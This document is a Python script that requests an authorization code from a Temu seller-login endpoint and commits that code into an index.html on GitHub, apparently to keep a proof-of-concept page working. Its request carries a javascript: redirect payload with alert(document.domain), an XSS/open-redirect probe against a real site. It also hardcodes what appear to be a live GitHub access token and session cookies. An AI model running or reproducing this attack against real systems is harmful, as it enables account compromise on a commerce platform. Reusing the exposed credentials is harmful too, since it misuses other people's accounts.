"""
Auto-update `const code = ...;` inside index.html using GitHub Contents API.

Install:
  pip install requests

Run:
  python update_code.py
"""

import base64
import json
import re
import sys
import requests

# ---- CONFIG (edit these) ----
GITHUB_TOKEN = "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"  # <-- paste your token locally (do NOT commit this)
OWNER = "dasdsa0d8s9a"
REPO = "dsadsadsadsadasdsa"
FILE_PATH = "index.html"
BRANCH = "main"  # change if your default branch differs (e.g., "master")
FETCH_URL = "https://seller.kuajingmaihuo.com/bg/quiet/api/auth/obtainCode"
COMMIT_MESSAGE = "Auto-update code constant"
# -----------------------------


def gh_headers(token: str) -> dict:
    return {
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28",
        "User-Agent": "code-autoupdater",
    }


def fetch_code(url: str) -> str:
    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Anti-Content': '0aqWfxUkMwVefPraE8nLpSpjN8X00W9AnN7wKDmT6KRF6b219N9LwiXY3Vh9W-fY9Rk6V61ruxJM0b0LACXv35DcYPqGB73q0Ts_niFlu8ysgUJOx3S8VIFGwKeXy1t4KIciQ7GdJnqdKoyOFOpOYGYySXpXYntNz7_NJl2g5d-lD-TWA8uzQpXQQh5jfpXKcpFFc456nhOxGGgbh_5YPP_v7n6v_XJPg1XpNyHVw1eF11m4Uf6ju9xguVodp7q_X-QGOysIc2GquinktZItJHoyX4YVuj0Yc09aXUgyXY4qnG9JXUuxgUEynYXacUgxnp9xXUdXI02XWPEzRrn5k7k-evXsCMRRv7klpMfRIkL2VKDbk-3tCS-xT1RPTIB2SKBjV199pXpDbdtXxnn2uW4V1YdNnTFrNa_CvnUuYjUXadnmbNTExNAZkYXrsTsiipFr6xn2WWXKoYuv6j0gL4fPtVTSf577fTfjAtVgvBTM3vEM2OkdW5uMBXTF1zS62NCvMFDmxGIMRcv-7fKSZoFrvuvmc12cXKfOH0VxxkFRVOFS6QiNinYujGqTilpo2qATcQ0dFPuy8jcvrfhe3qiOYhRiPP990omhjgWQgtez',
        'sec-ch-ua-platform': '"Windows"',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
        'content-type': 'application/json',
        'X-Date': '2026-01-13T22:48:23.693Z',
        'sec-ch-ua-mobile': '?0',
        'Accept': '*/*',
        'Origin': 'https://seller.kuajingmaihuo.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://seller.kuajingmaihuo.com/settle/seller-login?redirectUrl=javascript%3A%2F%2Fagentseller.temu.com%0Aalert%28document.domain%29.com&region=1&source=https%3A%2F%2Fagentseller.temu.com%2Fmain%2Fauthentication%3FredirectUrl%3Djavascript%253A%252F%252Fagentseller.temu.com%25250aalert%28document.domain%29.com',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': 'api_uid=CmOogmldoUgbJABUgVdTAg==; _nano_fp=XpmjnqmYXqCal0TonC__Vy5_4UMmJzd17mRKNzW5; _bee=p0dOuRumF8R0oYdboNl6aWQHIDf3namv; _f77=f9f2a716-ca17-4806-aeb2-1772ea8eaf0c; rckk=p0dOuRumF8R0oYdboNl6aWQHIDf3namv; ru1k=f9f2a716-ca17-4806-aeb2-1772ea8eaf0c; _a42=6e6979e0-57fe-4d5e-9943-7caf9df9ac8a; ru2k=6e6979e0-57fe-4d5e-9943-7caf9df9ac8a; SUB_PASS_ID=eyJ0IjoiWkM2WTdMMVhPR3p2RTJpWUlKQ0RvMjJUQWlFTmNUbDg1SEt1VHVRN0I1Um04bTlxVUVEN0RHcXptVGR3bnVLeCIsInYiOjEsInMiOjEwMDAwLCJ1IjoyNDU3MzIwMzgwNzQ1M30=',
    }
    payload = {"redirectUrl":"https://agentseller.temu.com/main/authentication?redirectUrl=javascript%3A%2F%2Fagentseller.temu.com%250aalert(document.domain).com"}

    r = requests.post(url, headers=headers, json=payload, timeout=20)
    r.raise_for_status()
    data = r.json()

    if not data.get("success"):
        raise RuntimeError(f"fetchcode returned success=false: {data}")

    result = data.get("result") or {}
    code = result.get("code")
    if not isinstance(code, str) or not code.strip():
        raise RuntimeError(f"Missing/invalid result.code in response: {data}")

    return code.strip()


def get_github_file(owner: str, repo: str, path: str, branch: str, token: str) -> dict:
    url = f"https://api.github.com/repos/{owner}/{repo}/contents/{path}"
    r = requests.get(url, headers=gh_headers(token), params={"ref": branch}, timeout=30)
    r.raise_for_status()
    data = r.json()

    if "content" not in data or "sha" not in data:
        raise RuntimeError(f"Unexpected GitHub response (missing content/sha): {data}")

    return data


def update_const_code(html_text: str, new_code: str) -> str:
    """
    Finds the first occurrence of:
      const code = SOMEVALUE;
    Replaces SOMEVALUE with the fetched code.
    If the existing value is quoted, keeps quote style.
    Otherwise, replaces with a quoted string.
    """
    pattern = r"(const\s+code\s*=\s*)(.*?)(\s*;)"
    m = re.search(pattern, html_text, flags=re.DOTALL)
    if not m:
        raise RuntimeError("Could not find `const code = ...;` in index.html")

    old_value = m.group(2).strip()

    if (old_value.startswith('"') and old_value.endswith('"')) or (
        old_value.startswith("'") and old_value.endswith("'")
    ):
        q = old_value[0]
        replacement_value = f"{q}{new_code}{q}"
    else:
        replacement_value = f"\"{new_code}\""

    # Use a replacement function to avoid backslash/backref issues.
    def repl(match: re.Match) -> str:
        return f"{match.group(1)}{replacement_value}{match.group(3)}"

    return re.sub(pattern, repl, html_text, count=1, flags=re.DOTALL)


def put_github_file(
    owner: str,
    repo: str,
    path: str,
    branch: str,
    token: str,
    new_text: str,
    sha: str,
    message: str,
) -> dict:
    url = f"https://api.github.com/repos/{owner}/{repo}/contents/{path}"
    content_b64 = base64.b64encode(new_text.encode("utf-8")).decode("utf-8")

    payload = {
        "message": message,
        "content": content_b64,
        "sha": sha,
        "branch": branch,
    }

    # IMPORTANT: send as JSON
    r = requests.put(url, headers=gh_headers(token), json=payload, timeout=30)
    r.raise_for_status()
    return r.json()


def main() -> int:
    if not GITHUB_TOKEN or "PASTE_YOUR_TOKEN_HERE" in GITHUB_TOKEN:
        print("Error: Please paste your GitHub token into GITHUB_TOKEN at the top of the script.", file=sys.stderr)
        return 2

    new_code = fetch_code(FETCH_URL)
    print(f"Fetched code: {new_code}")

    file_data = get_github_file(OWNER, REPO, FILE_PATH, BRANCH, GITHUB_TOKEN)
    sha = file_data["sha"]

    # GitHub often includes newlines in base64 content; strip them.
    content_str = (file_data.get("content") or "").replace("\n", "").strip()
    old_bytes = base64.b64decode(content_str.encode("utf-8"))
    old_text = old_bytes.decode("utf-8", errors="replace")

    updated_text = update_const_code(old_text, new_code)
    if updated_text == old_text:
        print("No change detected; nothing to commit.")
        return 0

    result = put_github_file(
        OWNER, REPO, FILE_PATH, BRANCH, GITHUB_TOKEN, updated_text, sha, COMMIT_MESSAGE
    )

    commit_url = (result.get("commit") or {}).get("html_url")
    if commit_url:
        print(f"Updated {FILE_PATH}. Commit: {commit_url}")
    else:
        print(f"Updated {FILE_PATH}.")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except requests.HTTPError as e:
        resp = getattr(e, "response", None)
        if resp is not None:
            print("HTTP error response:", resp.text, file=sys.stderr)
        raise
